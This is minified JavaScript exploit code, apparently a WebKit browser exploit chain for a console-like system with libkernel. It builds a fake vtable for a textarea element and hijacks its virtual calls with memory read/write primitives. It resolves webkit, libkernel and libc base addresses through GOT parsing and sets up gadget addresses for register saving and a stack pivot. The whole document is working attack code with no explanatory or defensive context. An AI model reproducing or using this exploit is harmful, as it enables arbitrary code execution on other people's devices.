var tarea=document.createElement("textarea"),real_vt_ptr=read_ptr_at(addrof(tarea)+24),fake_vt_ptr=malloc(1024);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,1024));var real_vtable=read_ptr_at(fake_vt_ptr),fake_vtable=malloc(8192);write_mem(fake_vtable,read_mem(real_vtable,8192)),write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(1024);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,1024));var plt_ptr=read_ptr_at(fake_vtable)-17100888;function get_got_addr(a){var b=plt_ptr+16*a,c=read_mem(b,6);if(255!=c[0]||37!=c[1])throw"invalid GOT entry";for(var d=0,e=5;2<=e;e--)d=256*d+c[e];return d+=b+6,read_ptr_at(d)}var webkit_base=read_ptr_at(fake_vtable)-16777216,libkernel_base=get_got_addr(1111),libc_base=get_got_addr(21),saveall_addr=libc_base+137540,loadall_addr=libc_base+155272,pivot_addr=libc_base+155390,infloop_addr=libc_base+234944,jop_frame_addr=libc_base+418256,get_errno_addr_addr=libkernel_base+50304,pthread_create_addr=libkernel_base+151056;function saveall(){var a=malloc(2048),b=read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(a,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));var b=read_ptr_at(fake_vtable+472);return write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(fake_vt_ptr+56,4660),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(a+1024,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024)),a}function pivot(a){var b=malloc(1024),c=read_ptr_at(fake_vtable+456);write_ptr_at(fake_vtable+456,saveall_addr),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(b,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));var c=read_ptr_at(fake_vtable+456);write_ptr_at(fake_vtable+456,pivot_addr),write_ptr_at(fake_vt_ptr+56,a),write_ptr_at(b+56,read_ptr_at(b+56)-16),write_ptr_at(a,b),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024))}